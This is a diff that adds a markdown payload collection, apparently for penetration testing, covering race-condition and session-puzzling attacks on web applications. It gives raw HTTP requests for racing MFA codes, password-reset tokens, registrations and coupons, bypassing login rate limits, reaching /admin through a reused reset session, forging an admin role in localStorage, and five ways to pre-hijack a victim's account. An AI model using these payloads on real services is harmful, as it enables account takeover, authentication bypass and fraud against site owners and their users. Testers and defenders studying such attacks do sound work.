@@ -1,0 +1,79 @@
+# Race Condition & Session Puzzling Payloads
+
+## Single-Packet Race (HTTP/2 multiplexing)
+# Send multiple streams in single TCP packet
+# Use Turbo Intruder or custom Python with h2 library
+
+## MFA Code Race
+# Submit same valid MFA code 10+ times simultaneously
+POST /verify-mfa HTTP/2
+code=123456
+
+## Registration Race (same email)
+POST /register HTTP/2
+email=target@example.com&password=Pass1!&username=user1
+
+POST /register HTTP/2
+email=target@example.com&password=Pass2!&username=user2
+
+## Password Reset Token Race
+POST /reset-password HTTP/2
+token=VALID_TOKEN&new_password=NewPass1!
+
+POST /reset-password HTTP/2
+token=VALID_TOKEN&new_password=NewPass2!
+
+## Coupon/Promo Code Race
+POST /apply-coupon HTTP/2
+code=DISCOUNT50
+
+## Rate Limit Bypass via Race
+# Send 50+ login attempts in single packet
+POST /login HTTP/2
+email=admin@target.com&password=attempt1
+
+## Session Puzzling Payloads
+# Step 1: Start password reset flow (creates session variable)
+POST /forgot-password
+email=admin@target.com
+# Step 2: Visit admin panel (reuses reset session state)
+GET /admin
+
+## SPA Auth State Confusion
+# localStorage manipulation
+localStorage.setItem('user', '{"role":"admin","authenticated":true}')
+localStorage.setItem('token', 'eyJ...')
+sessionStorage.setItem('auth_state', 'authenticated')
+
+## Account Pre-Hijacking
+# Class 1: Classic-Federated Merge
+# Create account with target email, wait for SSO login
+POST /register
+email=victim@target.com&password=attacker123
+
+# Class 2: Unexpired Session
+# Create account, get session, don't log out
+POST /register
+email=victim@target.com&password=attacker123
+# Save session cookie, wait for victim to reset password
+
+# Class 3: Trojan Identifier
+# Add attacker email as secondary to pre-created account
+POST /settings/add-email
+secondary_email=attacker@evil.com
+
+# Class 4: Non-Verifying IdP
+# Register on IdP with victim email (no verification)
+# Then SSO into target app
+
+# Class 5: Email Change
+# Create account, start email change to victim email
+# Don't complete verification
+POST /settings/change-email
+new_email=victim@target.com
+
+## Parallel Session Flow Race
+# Open multiple browser tabs simultaneously
+# Tab 1: Login as user A
+# Tab 2: Login as user B
+# Tab 3: Access /admin (may get mixed session)
